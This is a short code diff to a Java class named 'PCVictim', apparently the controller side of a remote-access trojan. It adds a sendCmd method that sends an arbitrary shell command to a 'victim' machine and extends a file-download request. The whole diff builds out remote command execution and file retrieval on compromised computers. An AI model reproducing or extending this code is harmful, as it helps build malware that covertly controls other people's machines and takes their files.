@@ -20,7 +20,7 @@ public class PCVictim {
     }
 
     public void disconnect() {
-        context.disconnect();
+        context.close();
     }
 
     public void sendAuthPCVictim() {
@@ -120,6 +120,14 @@ public class PCVictim {
         query.put("action", "download.file");
         query.put("path", path);
         query.put("port", port);
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
+    public void sendCmd(String command, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "cmd");
+        query.put("command", command);
         query.put("owner", owner);
         sendMessage(query);
     }
